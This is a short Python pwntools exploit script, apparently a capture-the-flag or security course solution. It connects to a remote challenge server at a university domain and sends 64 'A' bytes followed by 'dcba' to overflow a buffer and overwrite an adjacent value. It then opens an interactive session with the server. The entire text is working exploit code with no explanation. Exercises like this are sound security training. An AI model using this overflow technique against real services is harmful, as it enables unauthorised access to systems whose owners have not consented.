from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22152)

print(s.recvline())
s.sendline("A"*0x40+"dcba")

s.interactive()
